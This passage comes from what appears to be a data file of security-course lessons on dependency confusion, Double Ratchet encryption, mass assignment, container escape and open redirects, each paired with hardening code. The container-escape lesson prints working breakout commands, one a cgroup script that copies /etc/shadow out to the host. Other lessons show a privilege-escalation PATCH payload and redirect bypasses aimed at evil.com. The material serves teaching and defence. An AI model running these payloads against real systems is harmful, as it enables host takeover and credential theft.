          'Never use npm install in CI/CD; always use npm ci with scoped package namespaces.',
      },
    ],
    cveCaseStudy: {
      title: 'Alex Birsan $130,000 Dependency Confusion Research',
      cveId: 'Dependency Confusion Attack 2021',
      year: '2021',
      organization: 'Apple, Microsoft, Uber, Tesla, Netflix, Shopify',
      damage: 'Over 35 major tech companies compromised through public dependency substitution',
      breakdown:
        'Security researcher Alex Birsan scanned public GitHub repositories and package-lock files for proprietary package names. He registered the identical names on npm, PyPI, and RubyGems with version numbers like 9000.0.0. Within hours, corporate CI/CD pipelines across Fortune 500 tech companies automatically executed his non-malicious diagnostic scripts.',
      rootCause:
        'Package managers default to the highest semver version across mixed public/private registry configs.',
      takeaway:
        'Scope all internal packages under an official reserved organization prefix (e.g. @company/...).',
    },
    hardeningGuide: {
      title: 'Software Supply Chain Hardening Blueprint',
      checklist: [
        'Always run npm ci (not npm install) in CI/CD pipelines.',
        'Prefix all internal proprietary packages with a registered organization scope (@company/...).',
        'Configure explicit scoped registry routing inside .npmrc.',
        'Use --ignore-scripts during dependency installation when postinstall is not required.',
      ],
      codeSample: {
        language: 'ini',
        filename: '.npmrc',
        code: `# Strict scoped registry routing in .npmrc
@company:registry=https://npm.corp.internal/
//npm.corp.internal/:_authToken=\${INTERNAL_NPM_TOKEN}

# Public packages stay on official registry
registry=https://registry.npmjs.org/
always-auth=false`,
        note: 'Ensures @company/* packages can never be requested from public npmjs.org.',
      },
    },
    faqs: [
      {
        question: 'Why is npm ci safer than npm install in automated pipelines?',
        answer:
          'npm install can modify package-lock.json and download newer semver versions. In contrast, npm ci requires an existing lockfile and will immediately fail the build if there is even a single mismatch with package-lock.json.',
      },
      {
        question: 'What is an SBOM (Software Bill of Materials)?',
        answer:
          'An SBOM is a formal, machine-readable inventory of all software components, libraries, and dependencies that make up an application, enabling rapid vulnerability assessment when a zero-day (like Log4j) is disclosed.',
      },
    ],
  },
  {
    id: 'e2ee-double-ratchet',
    title: 'End-to-End Encryption & The Double Ratchet',
    subtitle:
      'Forward secrecy & post-compromise security: how Signal & WhatsApp achieve self-healing cryptographic channels',
    track: 'crypto',
    trackTitle: 'Applied Cryptography & Data Protection',
    duration: '13 min',
    level: 'Advanced',
    summary:
      'Standard TLS only protects client-to-server. The Double Ratchet Protocol combines Diffie-Hellman asymmetric ratchets with symmetric KDF ratchets to achieve both Forward Secrecy and self-healing Post-Compromise Security.',
    keyConcepts: [
      'Transport Encryption vs True End-to-End Encryption',
      'The Diffie-Hellman Ephemeral Ratchet (Asymmetric)',
      'The Symmetric KDF Chain Ratchet (Per-message keys)',
      'Post-Compromise Security (Future Secrecy)',
    ],
    threatModel: {
      actor:
        'Malicious messaging server, compromised relay database, or active state eavesdropper with temporary device access.',
      goal: 'Read private messages in plaintext or decrypt past/future message histories if a temporary session key is leaked.',
      vulnerability: 'Static encryption keys or centralized server-side message decryption.',
      defense:
        'Double Ratchet Protocol constantly rotates ephemeral keys for every single message sent, healing automatically after key leaks.',
    },
    steps: [
      {
        title: 'Step 1: Transport TLS vs True End-to-End Encryption',
        description:
          'Standard web apps terminate TLS at the reverse proxy; E2EE encrypts device-to-device.',
        detail:
          "Under standard TLS, messages travel encrypted on the wire, but sit in plaintext in the cloud messaging database. If the server is hacked or subpoenaed, all chats leak. Under E2EE, messages are encrypted on Alice's phone and can ONLY be decrypted on Bob's phone.",
        actionSummary: "Alice encrypts message with Bob's key; Server sees only opaque ciphertext",
        securityTakeaway:
          'Zero knowledge on the server: even the messaging company cannot read user messages.',
      },
      {
        title: 'Step 2: The Symmetric KDF Ratchet (Forward Secrecy)',
        description: 'Every single message is encrypted with a brand new, one-time Message Key.',
        detail:
          'For each message, a Key Derivation Function (HKDF) derives `MessageKey, ChainKey_next = KDF(ChainKey_current)`. The Message Key is used once and instantly erased from memory. If an attacker steals a message key later, they cannot reverse the KDF hash to read previous messages.',
        actionSummary: 'Each message uses an ephemeral one-time key derived from one-way hash',
        securityTakeaway:
          'Forward Secrecy guarantees past messages remain secure even if current keys are compromised.',
      },
      {
        title: 'Step 3: The Diffie-Hellman Ratchet (Turn-Based)',
        description:
          'Whenever speaking turns alternate, an asymmetric Diffie-Hellman exchange updates the Root Key.',
        detail:
          'When Alice sends a reply to Bob, she generates a fresh Curve25519 ephemeral keypair. Bob computes the new shared DH secret and mixes it into the Root KDF. This ratchets the entire chain forward with fresh mathematical entropy.',
        actionSummary: 'Sender generates new DH keypair on turn change -> New Root Secret',
        securityTakeaway:
          'The DH ratchet provides the mathematical entropy needed for self-healing cryptographic channels.',
      },
      {
        title: 'Step 4: Post-Compromise Security (Self-Healing)',
        description:
          'If an attacker steals the entire current cryptographic state, the protocol automatically heals.',
        detail:
          "Suppose an attacker physically reads memory and steals the active keys at Message #5. The attacker can read Message #5. But as soon as Bob replies, a new Diffie-Hellman ratchet occurs with a private key the attacker doesn't have. The protocol re-keys itself, locking the attacker out forever!",
        actionSummary:
          'Protocol heals on next DH turn -> Attacker locked out of all future messages',
        securityTakeaway:
          'Post-Compromise Security guarantees that compromised channels self-heal automatically.',
      },
    ],
    cveCaseStudy: {
      title: 'Pegasus Spyware & The Mandate for Forward Secrecy',
      cveId: 'Amnesty Security Lab Forensic Reports',
      year: '2021',
      organization: 'Targeted Journalists & Human Rights Activists Worldwide',
      damage: 'Zero-click surveillance attempts targeting mobile devices',
      breakdown:
        'Advanced surveillance vendors deployed zero-click exploits to inspect mobile memory. For applications without forward secrecy, extracting a single master key allowed retroactively decrypting years of recorded network traffic. E2EE messaging protocols with Double Ratchet ensured that historical messages whose ephemeral keys had been erased remained cryptographically undecryptable.',
      rootCause: 'Static or cloud-held private keys allowing retrospective decryption.',
      takeaway:
        'Ephemeral per-message keys (Double Ratchet) ensure that past communications cannot be decrypted retrospectively.',
    },
    hardeningGuide: {
      title: 'Modern E2EE Architecture Checklist',
      checklist: [
        'Adopt the audited Signal Protocol (libsignal) for end-to-end encrypted messaging.',
        'Implement prekeys (X3DH) for asynchronous initial key agreement.',
        'Immediately zeroize (overwrite memory) of one-time message keys after use.',
        'Provide Safety Number / QR code fingerprint verification to detect man-in-the-middle attacks.',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'e2ee-ratchet.ts',
        code: `// Conceptual Double Ratchet step in TypeScript
interface RatchetState {
  rootKey: Uint8Array;
  chainKey: Uint8Array;
  dhKeyPair: CryptoKeyPair;
}

export async function ratchetSend(state: RatchetState, plaintext: string) {
  // 1. Advance symmetric KDF chain (Forward Secrecy)
  const { nextChainKey, messageKey } = await kdfChain(state.chainKey);
  state.chainKey = nextChainKey;

  // 2. Encrypt plaintext with one-time message key (AES-256-GCM)
  const ciphertext = await encryptAesGcm(messageKey, plaintext);

  // 3. Zeroize / overwrite ephemeral message key immediately
  messageKey.fill(0);

  return ciphertext;
}`,
        note: 'Zeroizing message keys in memory ensures forward secrecy is physically maintained.',
      },
    },
    faqs: [
      {
        question: 'Why does WhatsApp use the Double Ratchet Protocol if it is closed source?',
        answer:
          'WhatsApp partnered directly with Open Whisper Systems (Signal) in 2016 to integrate the open-source libsignal protocol library into their apps. The protocol itself is the exact same cryptographic implementation as Signal.',
      },
      {
        question: 'What is X3DH (Extended Triple Diffie-Hellman)?',
        answer:
          'X3DH is the initial key agreement protocol used before the Double Ratchet begins. It allows Alice to send an end-to-end encrypted message to Bob even if Bob is offline, using pre-published public keys stored on the server.',
      },
    ],
  },
  {
    id: 'mass-assignment',
    title: 'Mass Assignment & Object Injection',
    subtitle:
      'Preventing automatic binding of untrusted HTTP payload keys to internal database model attributes',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '12 min',
    level: 'Intermediate',
    summary:
      'Mass assignment occurs when client-provided parameters (such as JSON bodies or form fields) are automatically bound to server-side data models without strict allowlisting, allowing attackers to escalate privileges or overwrite protected fields.',
    keyConcepts: [
      'Data Transfer Objects (DTO)',
      'Schema Allowlisting with Zod',
      'ORM Model Separation',
      'Strong Parameters Pattern',
      'Field-Level Access Control',
    ],
    threatModel: {
      actor: 'Malicious authenticated or unauthenticated HTTP client',
      goal: 'Privilege escalation (e.g. setting role: "admin", isVerified: true, or modifying account balances)',
      vulnerability:
        'Blind deserialization of req.body directly into ORM entities or SQL update statements without DTO filtering',
      defense:
        'Strict Data Transfer Object (DTO) validation, schema allowlisting (Zod/Pydantic), and decoupling API request models from database persistence entities',
    },
    steps: [
      {
        title: 'Step 1: Unfiltered Client Payload Submission',
        description:
          'An attacker crafts an HTTP request containing sensitive internal properties alongside normal profile fields.',
        detail:
          'Modern REST and GraphQL APIs often accept JSON payloads. If the client submits {"displayName": "Alice", "role": "admin", "isVerified": true}, an unhardened server receives all keys without evaluating if the client has permission to set them.',
        actionSummary: 'Attacker injects "role": "admin" into account update payload',
        securityTakeaway:
          'All client-supplied data is untrusted by default; incoming keys must be validated against a known-good schema.',
        codeSnippet: {
          language: 'http',
          label: 'Attacker Malicious PATCH Payload',
          code: `PATCH /api/users/profile HTTP/1.1
Host: api.saas-platform.com
Authorization: Bearer user_token_99
Content-Type: application/json

{
  "displayName": "Alice Walker",
  "email": "alice@company.com",
  "role": "admin",
  "accountBalance": 1000000
}`,
        },
      },
      {
        title: 'Step 2: Blind ORM Model Binding',
        description:
          'The backend controller passes the raw request body directly to an ORM update method.',
        detail:
          'Developers often write convenient shorthand like User.update(req.body, { where: { id: req.user.id } }). The ORM maps every JSON key directly to the corresponding database table columns, blindly executing an UPDATE statement for all fields.',
        actionSummary: 'Server executes User.update(req.body) without property filtering',
        securityTakeaway: 'Convenience methods in ORMs must never accept raw HTTP inputs directly.',
        codeSnippet: {
          language: 'typescript',
          label: 'Vulnerable Controller Code',
          code: `// VULNERABLE CONTROLLER
app.patch('/api/users/profile', async (req, res) => {
  // CRITICAL FLAW: Blind mass assignment of req.body
  await db.User.update(req.body, {
    where: { id: req.user.id }
  });

  return res.json({ success: true });
});`,
        },
      },
      {
        title: 'Step 3: Privilege Escalation in the Database',
        description:
          'The database executes the update statement, elevating the user to administrator status.',
        detail:
          'Because the database table has a role column, the SQL statement UPDATE users SET displayName = "Alice", role = "admin" WHERE id = 99 succeeds. The attacker now possesses administrative capabilities across the entire application.',
        actionSummary: 'Database sets role = "admin" for regular user account',
        securityTakeaway:
          'Database integrity constraints cannot protect against valid column names passed via mass assignment.',
        codeSnippet: {
          language: 'sql',
          label: 'Executed Database SQL Query',
          code: `-- Database executes unvalidated update
UPDATE "users" 
SET "displayName" = 'Alice Walker',
    "role" = 'admin',
    "accountBalance" = 1000000,
    "updatedAt" = NOW()
WHERE "id" = 'user_99';`,
        },
      },
      {
        title: 'Step 4: Mitigation via Strict DTO Schemas',
        description:
          'Introducing schema validation (e.g. Zod .strict()) that explicitly strips or rejects unknown properties.',
        detail:
          'By declaring a strict Data Transfer Object (DTO) schema, any property not explicitly declared is rejected with an HTTP 400 Bad Request error or stripped before reaching the domain logic.',
        actionSummary: 'Zod schema strips or rejects unauthorized fields like "role"',
        securityTakeaway:
          'Allowlisting authorized properties is far more secure than attempting to blocklist forbidden properties.',
        codeSnippet: {
          language: 'typescript',
          label: 'Zod DTO Allowlist Validation',
          code: `import { z } from 'zod';

// Strict DTO schema with allowlisted properties
const UpdateProfileDto = z.object({
  displayName: z.string().min(1).max(50),
  email: z.string().email(),
  bio: z.string().max(250).optional(),
}).strict(); // .strict() rejects unexpected properties like role

const sanitizedData = UpdateProfileDto.parse(req.body);`,
        },
      },
      {
        title: 'Step 5: Entity Layer & Database Decoupling',
        description:
          'Separating external API request representations from internal persistence entities.',
        detail:
          'Production architectures decouple API representations from database entities. Dedicated repository functions only accept explicit, strongly-typed domain objects, preventing direct mapping of HTTP parameters to database columns.',
        actionSummary: 'Repository updates only explicitly authorized columns',
        securityTakeaway:
          'Explicit field mapping guarantees that sensitive attributes can only be modified through dedicated administrative endpoints.',
        codeSnippet: {
          language: 'typescript',
          label: 'Explicit Column Mapping',
          code: `// HARDENED REPOSITORY LAYER
await userRepository.updateProfile(req.user.id, {
  displayName: sanitizedData.displayName,
  email: sanitizedData.email,
  bio: sanitizedData.bio,
}); // role, balance, and flags cannot be modified here`,
        },
      },
    ],
    cveCaseStudy: {
      title: 'The 2012 GitHub Public Key Mass Assignment Vulnerability',
      cveId: 'GitHub Incident (2012)',
      year: '2012',
      organization: 'GitHub',
      damage:
        'Security researcher Egor Homakov committed an unauthorized public SSH key to the Rails master repository on GitHub, achieving full commit access to one of the most prominent open source projects in the world.',
      breakdown:
        'Ruby on Rails ActiveRecord permitted mass assignment by default unless models explicitly declared attr_accessible. When adding a new public SSH key, the GitHub controller accepted params[:public_key]. By adding public_key[user_id]=1, Homakov bound his SSH key to user ID 1 (Rails core team) and gained repository write privileges.',
      rootCause:
        'Automatic mass assignment in Rails ActiveRecord models without mandatory strong parameters or allowlist parameter filtering.',
      takeaway:
        'Never pass unfiltered HTTP parameters to persistence layers. Modern frameworks (Rails Strong Parameters, NestJS DTOs, Zod) now enforce parameter allowlists by default.',
    },
    hardeningGuide: {
      title: 'Production Mass Assignment Hardening Guide',
      checklist: [
        'Always validate incoming HTTP payloads against a strict schema (e.g. Zod, Pydantic, class-validator) that strips or rejects extraneous keys.',
        'Never pass req.body or unfiltered JSON objects directly to ORM create/update methods (e.g. Prisma, TypeORM, Sequelize).',
        'Enforce Data Transfer Objects (DTOs) with explicit allowlists of user-modifiable fields.',
        'Separate public user-profile endpoints from administrative endpoints that manage roles, permissions, and billing.',
        'Configure ORM attributes with read-only flags or exclusion lists for sensitive columns (e.g., role, is_admin, password_hash).',
      ],
      codeSample: {
        language: 'typescript',
        filename: 'src/controllers/userController.ts',
        code: `import { Request, Response } from 'express';
import { z } from 'zod';
import { prisma } from '../lib/prisma';

// 1. Strict allowlist DTO schema
const UpdateUserProfileSchema = z.object({
  displayName: z.string().trim().min(2).max(50),
  bio: z.string().max(200).optional(),
  avatarUrl: z.string().url().optional(),
}).strict(); // Rejects any unpermitted keys like role, isAdmin, accountBalance

export async function updateUserProfile(req: Request, res: Response) {
  // 2. Parse and sanitize input
  const validationResult = UpdateUserProfileSchema.safeParse(req.body);
  if (!validationResult.success) {
    return res.status(400).json({ 
      error: 'Invalid request payload',
      details: validationResult.error.flatten().fieldErrors 
    });
  }

  const { displayName, bio, avatarUrl } = validationResult.data;

  // 3. Explicit database update with safe fields only
  const updatedUser = await prisma.user.update({
    where: { id: req.user.id },
    data: {
      displayName,
      bio,
      avatarUrl,
    },
    select: {
      id: true,
      displayName: true,
      email: true,
      avatarUrl: true,
    }
  });

  return res.json({ user: updatedUser });
}`,
        note: 'Using Zod with .strict() and explicit Prisma data properties guarantees no unpermitted fields are modified.',
      },
    },
    faqs: [
      {
        question: 'How does Mass Assignment differ from Insecure Direct Object References (IDOR)?',
        answer:
          "IDOR involves manipulating an identifier (e.g. /users/42 -> /users/43) to access another user's resources. Mass Assignment involves injecting unpermitted attributes (e.g. role: admin) into a resource you already have legitimate access to modify.",
      },
      {
        question: 'Why do modern ORMs still support mass assignment?',
        answer:
          'Mass assignment is convenient during rapid prototyping and simplifies mapping validated DTOs to entities. However, security best practices dictate that input validation and sanitization must occur before data reaches the ORM.',
      },
    ],
  },
  {
    id: 'container-escape',
    title: 'Container Escape & Sandbox Breakout',
    subtitle:
      'How privileged containers and exposed Docker sockets allow adversaries to escape Linux namespaces and take over the host kernel',
    track: 'architecture',
    trackTitle: 'System & Cloud Architecture',
    duration: '16 min',
    level: 'Advanced',
    summary:
      'Containers share the host operating system kernel and rely on Linux namespaces and cgroups for isolation. Misconfigurations such as mounting the Docker socket or running with --privileged allow attackers to break out of the container boundary and take over the host system.',
    keyConcepts: [
      'Linux Namespaces & cgroups',
      'Docker Socket (/var/run/docker.sock)',
      'Linux Capabilities (CAP_SYS_ADMIN)',
      'Rootless Containers',
      'runc Breakout (CVE-2019-5736)',
    ],
    threatModel: {
      actor:
        'Attacker who has achieved remote code execution inside a containerized application or pod',
      goal: 'Escape container sandbox to access the host operating system, steal host credentials, and pivot across Kubernetes nodes',
      vulnerability:
        'Exposing /var/run/docker.sock inside containers, running with --privileged, or missing seccomp/AppArmor security profiles',
      defense:
        'Rootless container engines, dropping all Linux capabilities (--cap-drop=ALL), read-only root filesystems, and gVisor/Kata microVM sandboxing',
    },
    steps: [
      {
        title: 'Step 1: Linux Container Isolation Architecture',
        description:
          'Understanding that containers are isolated host processes sharing a single Linux kernel.',
        detail:
          'Unlike hardware virtualization (Hypervisors/VMs), containers isolate processes using Linux namespaces (PID, mount, network, IPC, UTS, user) and control groups (cgroups). The container root user is UID 0 on the host kernel unless user namespace remapping is configured.',
        actionSummary: 'Container process executes as isolated process on shared host kernel',
        securityTakeaway:
          'Containers are not security boundaries by default; they share the host kernel attack surface.',
        codeSnippet: {
          language: 'bash',
          label: 'Host Process Namespace Inspection',
          code: `# Inspecting container namespaces from host
$ ps -ef | grep my-app
root  14082  1201  0 10:00 ?  00:00:02 /usr/local/bin/my-app

# The container process has a real PID on the host system!
$ ls -l /proc/14082/ns/
lrwxrwxrwx 1 root root 0 net -> 'net:[4026532450]'
lrwxrwxrwx 1 root root 0 mnt -> 'mnt:[4026532451]'
lrwxrwxrwx 1 root root 0 pid -> 'pid:[4026532452]'`,
        },
      },
      {
        title: 'Step 2: The Danger of Mounting the Docker Socket',
        description:
          'Mounting /var/run/docker.sock inside a container grants full root access to the Docker daemon.',
        detail:
          'Developers sometimes mount the Docker daemon socket inside containers for CI/CD or monitoring tasks. Any process with read/write access to docker.sock can issue REST API calls to the daemon to spawn new privileged containers with the host root filesystem mounted.',
        actionSummary: 'Container interacts with Docker daemon to launch host-mounted container',
        securityTakeaway:
          'Mounting /var/run/docker.sock is equivalent to granting passwordless sudo root access on the host.',
        codeSnippet: {
          language: 'bash',
          label: 'Docker Socket Escape Command',
          code: `# DANGEROUS: Mounting host docker socket inside container
$ docker run -v /var/run/docker.sock:/var/run/docker.sock my-app

# Attacker inside container issues Docker API command to break out:
$ curl -s --unix-socket /var/run/docker.sock \\
  -H "Content-Type: application/json" \\
  -d '{"Image": "alpine", "Cmd": ["chroot", "/host", "sh"], "Binds": ["/:/host"]}' \\
  http://localhost/containers/create`,
        },
      },
      {
        title: 'Step 3: Privileged Flags & Capability Abuse',
        description:
          'Running with --privileged disables all seccomp filters and grants full kernel capabilities like CAP_SYS_ADMIN.',
        detail:
          'When a container runs with --privileged, it can access host hardware devices in /dev/ and mount host disk partitions. Attackers can mount /dev/sda1 inside the container or abuse the cgroup release_agent mechanism to execute arbitrary scripts on the host.',
        actionSummary: 'Attacker leverages CAP_SYS_ADMIN and cgroups to execute code on host',
        securityTakeaway:
          'Never run production containers with --privileged; grant only specific necessary capabilities.',
        codeSnippet: {
          language: 'bash',
          label: 'cgroup release_agent Host Breakout',
          code: `# Attacker abuses cgroup notify_on_release inside privileged container
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh\ncat /etc/shadow > '"$host_path"'/output' > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`,
        },
      },
      {
        title: 'Step 4: Kernel Exploits & runc Breakouts',
        description:
          'How vulnerabilities in container runtimes (such as CVE-2019-5736 in runc) allowed overwriting host binaries.',
        detail:
          'In CVE-2019-5736, runc maintained an open file descriptor pointing to the host runc binary during container initialization. A malicious container process could access /proc/self/exe, reopen it in write mode (O_WRONLY), and replace the host runc binary with a root backdoor.',
        actionSummary: 'Attacker overwrites host runc binary via /proc/self/exe file descriptor',
        securityTakeaway:
          'Even unprivileged containers can escape if runtime binaries or host kernels contain vulnerabilities.',
        codeSnippet: {
          language: 'c',
          label: 'runc Binary Overwrite Exploit',
          code: `// CVE-2019-5736 runc breakout concept
// Attacker replaces entrypoint with malicious executable
int fd = open("/proc/self/exe", O_RDONLY);
// When host runs 'docker exec', fd is targeted via /proc/<pid>/exe
int write_fd = open("/proc/[runc-pid]/exe", O_WRONLY | O_TRUNC);
write(write_fd, host_root_payload, payload_size);`,
        },
      },
      {
        title: 'Step 5: Hardened Container Architecture',
        description:
          'Deploying rootless engines, non-root users, dropping capabilities, and enforcing read-only root filesystems.',
        detail:
          'A hardened container drops all capabilities (--cap-drop=ALL), adds only required capabilities (e.g. NET_BIND_SERVICE), mounts a read-only root filesystem (--read-only), runs as an unprivileged user (UID 10001), and utilizes Seccomp profiles to block dangerous syscalls.',
        actionSummary: 'Enforcing defense-in-depth container sandboxing and microVM isolation',
        securityTakeaway:
          'Apply strict least-privilege principles to container runtimes and isolate multi-tenant workloads with gVisor or Kata.',
        codeSnippet: {
          language: 'yaml',
          label: 'Hardened Kubernetes Security Context',
          code: `# Kubernetes Hardened Pod Security Context
apiVersion: v1
kind: Pod
metadata:
  name: hardened-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    fsGroup: 10001
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: my-company/app:v1.2.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL`,
        },
      },
    ],
    cveCaseStudy: {
      title: 'CVE-2019-5736: runc Container Escape via File Descriptor Hijacking',
      cveId: 'CVE-2019-5736',
      year: '2019',
      organization: 'Docker / Kubernetes / runc Ecosystem',
      damage:
        'Critical CVSS 8.6 vulnerability enabling unprivileged container processes to overwrite the host runc binary and execute arbitrary root code on the host operating system.',
      breakdown:
        'When docker exec was invoked on a running container, the host runc binary joined the container mount and PID namespaces before executing the command. While doing so, a file descriptor to the host runc binary was momentarily exposed via /proc/self/exe. A compromised container process could attach to this descriptor and overwrite runc on the host host filesystem.',
      rootCause:
        'runc held an open file descriptor to the host binary while executing inside the attacker-controlled container namespace without write protection.',
      takeaway:
        'Containers share the host kernel. Runtime binaries must be protected with memfd execution or read-only binds, and host access must be restricted.',
    },
    hardeningGuide: {
      title: 'Production Container Hardening Checklist & Dockerfile',
      checklist: [
        'Never mount /var/run/docker.sock into production application containers.',
        'Never run containers with the --privileged flag.',
        'Run container processes as non-root users (USER 10001) in Dockerfile and Kubernetes securityContext.',
        'Drop all Linux capabilities by default (--cap-drop=ALL) and add only explicit requirements.',
        'Configure readOnlyRootFilesystem: true with ephemeral tmpfs volumes for temporary scratch directories.',
        'Use minimal distroless or Alpine base images to minimize the installed toolset and binary attack surface.',
        'Enforce Kubernetes Pod Security Standards (Restricted profile) and runtime seccomp profiles.',
      ],
      codeSample: {
        language: 'dockerfile',
        filename: 'Dockerfile.hardened',
        code: `# Stage 1: Build stage
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Stage 2: Hardened Runtime stage
FROM gcr.io/distroless/nodejs20-debian12:nonroot
WORKDIR /app

# Run as nonroot user (UID 65532)
USER nonroot:nonroot

# Copy only production artifacts
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./package.json

ENV NODE_ENV=production
EXPOSE 3000

# Immutable execution entrypoint
CMD ["dist/server.js"]`,
        note: 'Distroless images contain no shell, package manager, or unnecessary binaries, drastically reducing post-exploitation capability.',
      },
    },
    faqs: [
      {
        question: 'Is a Docker container as secure as a virtual machine (VM)?',
        answer:
          'No. Virtual machines run separate operating systems on virtualized hardware managed by a hypervisor. Containers share the host Linux kernel, meaning any unpatched kernel vulnerability can potentially allow container escape.',
      },
      {
        question: 'What are gVisor and Kata Containers?',
        answer:
          'gVisor is an application kernel (written in Go) that implements the Linux system call interface in user space, intercepting all container syscalls. Kata Containers runs each container inside an ultra-lightweight microVM with its own dedicated kernel for strong hardware isolation.',
      },
    ],
  },
  {
    id: 'open-redirect',
    title: 'Open Redirect Vulnerabilities',
    subtitle:
      'Exploiting unvalidated destination parameters to hijack OAuth tokens, evade email security filters, and launch realistic phishing',
    track: 'auth',
    trackTitle: 'Authentication & Identity Protocols',
    duration: '10 min',
    level: 'Beginner',
    summary:
      'Open redirect vulnerabilities occur when an application accepts untrusted URLs in redirection parameters without validation. Attackers use trusted domains to trick victims in phishing attacks and steal OAuth authorization tokens.',
    keyConcepts: [
      'Open Redirection (CWE-601)',
      'OAuth redirect_uri Token Hijacking',
      'Protocol-Relative URL Bypass (//evil.com)',
      'Strict Relative Path Validation',
      'Referer Header Code Leakage',
    ],
    threatModel: {
      actor: 'Phishing operator or credential harvesting attacker',
      goal: 'Bypass email filters, deceive users into entering credentials on spoofed sites, and hijack OAuth authorization codes',
      vulnerability:
        'Unvalidated redirect parameters such as ?return_to=, ?next=, or ?redirect_url= in login/logout handlers',
      defense:
        'Strict relative URL enforcement (verifying path starts with / and not //), domain allowlisting, and cryptographic HMAC signing for redirect targets',
    },
    steps: [
      {
        title: 'Step 1: Legitimate Post-Authentication Redirection',
        description:
          'How web applications utilize return parameters to redirect users after logging in.',
        detail:
          'When an unauthenticated user attempts to access /settings/billing, the application redirects them to /login?return_to=/settings/billing. After successful authentication, the server reads the parameter and issues an HTTP 302 Found redirect to the intended page.',
        actionSummary: 'User authenticates and server redirects to requested path',
        securityTakeaway:
          'Redirection parameters are convenient for UX but become dangerous when accepting external destinations.',
        codeSnippet: {
          language: 'http',
          label: 'Standard Post-Login 302 Redirect',
          code: `HTTP/1.1 302 Found
Location: /settings/billing
Set-Cookie: session_id=sess_78a9c...; HttpOnly; Secure`,
        },
      },
      {
        title: 'Step 2: Unvalidated External Destination Parameter',
        description:
          'An attacker crafts a URL using the trusted domain but directing the victim to an attacker-controlled site.',
        detail:
          'An attacker constructs https://trusted-bank.com/login?return_to=https://evil-phish.com. Victims see the legitimate, trusted domain name in their email or chat and click with confidence. Upon logging in, the server immediately redirects them to the spoofed malicious page.',
        actionSummary: 'Attacker leverages trusted domain to mask destination URL',
        securityTakeaway:
          'Users and security filters trust the domain in the address bar; open redirects turn your domain into a phishing lure.',
        codeSnippet: {
          language: 'http',
          label: 'Vulnerable Redirect Execution',
          code: `GET /login?return_to=https://evil-phish.com/harvest HTTP/1.1
Host: trusted-bank.com

# Vulnerable server blindly echoes return_to:
HTTP/1.1 302 Found
Location: https://evil-phish.com/harvest`,
        },
      },
      {
        title: 'Step 3: Parser Confusion & Protocol-Relative Bypasses',
        description:
          'Attackers evade naive validation filters using protocol-relative URLs and domain substring tricks.',
        detail:
          'Developers often attempt naive validation like url.startsWith("/") or url.includes("bank.com"). Attackers bypass startsWith("/") using protocol-relative URLs (//evil.com), which browsers interpret as https://evil.com. They bypass includes("bank.com") using subdomains or parameters (https://evil.com?ref=bank.com).',
        actionSummary: 'Attacker bypasses naive filters using //evil-phish.com',
        securityTakeaway:
          'Never use regex or substring matching for URL validation; parse URLs with built-in WHATWG URL objects.',
        codeSnippet: {
          language: 'javascript',
          label: 'Naive Validation Bypass Examples',
          code: `// NAIVE FILTER: Flawed check
if (targetUrl.startsWith('/')) {
  // FLAW: '//evil.com' starts with '/' but redirects externally in browsers!
  window.location.href = targetUrl;
}

// Bypasses:
// 1. '//evil-phish.com' -> https://evil-phish.com
// 2. '/\\\\evil-phish.com' -> https://evil-phish.com (Windows browser normalization)
// 3. 'https://bank.com.attacker.com'`,
        },
      },
      {
        title: 'Step 4: OAuth Authorization Code & Token Hijacking',
        description:
          'Chaining an open redirect with OAuth consent flows to leak authorization codes to an attacker.',
        detail:
          'If an OAuth client allows wildcard redirect URIs (https://app.com/*), an attacker can set redirect_uri=https://app.com/logout?next=https://evil.com. When the OAuth provider issues the authorization code to app.com, the open redirect forwards the user to evil.com, transmitting the authorization code in the HTTP Referer header.',
        actionSummary: 'Authorization code leaked in Referer header to external domain',
        securityTakeaway:
          'Open redirects on OAuth client applications can lead to full account takeover across the identity ecosystem.',
        codeSnippet: {
          language: 'http',
          label: 'OAuth Code Leakage via Referer',
          code: `GET /oauth/authorize?client_id=saas_app&redirect_uri=https://app.com/open-redirect?to=https://evil.com HTTP/1.1
Host: idp.company.com

# 1. IDP redirects to app.com with ?code=SECRET_CODE
# 2. app.com open redirect fires:
HTTP/1.1 302 Found
Location: https://evil.com
Referer: https://app.com/open-redirect?code=SECRET_AUTH_CODE`,
        },
      },
      {
        title: 'Step 5: Hardened Relative-Path & Allowlist Validation',
        description: 'Implementing strict relative path validation and explicit origin checking.',
        detail:
          'A safe redirect implementation ensures the target is strictly relative (url.startsWith("/") && !url.startsWith("//") && !url.includes("\\\\")) or parses the URL with new URL() to verify that url.origin exactly matches an explicit allowlist.',
        actionSummary: 'Server validates path format and enforces trusted origin check',
        securityTakeaway:
          'Strict relative path checking prevents protocol-relative escapes and blocks cross-origin redirects.',
        codeSnippet: {
          language: 'typescript',
          label: 'Safe Relative Path Sanitizer',
          code: `export function getSafeRedirectUrl(target: string | undefined, defaultUrl = '/dashboard'): string {
  if (!target) return defaultUrl;

  // Enforce strict relative path (single slash, no protocol-relative //, no backslashes)
  if (target.startsWith('/') && !target.startsWith('//') && !target.includes('\\\\')) {
    return target;
  }

  return defaultUrl;
}`,
        },
      },
    ],
    cveCaseStudy: {
      title: 'OAuth 2.0 Account Takeover via Open Redirect & State Leakage',
      cveId: 'CWE-601 / RFC 6749 Sec 10.6',
      year: '2020',
      organization: 'Multiple SaaS Identity Providers',
      damage:
        'Account takeover across thousands of connected accounts by chaining open redirects with OAuth authorization code flows.',
      breakdown:
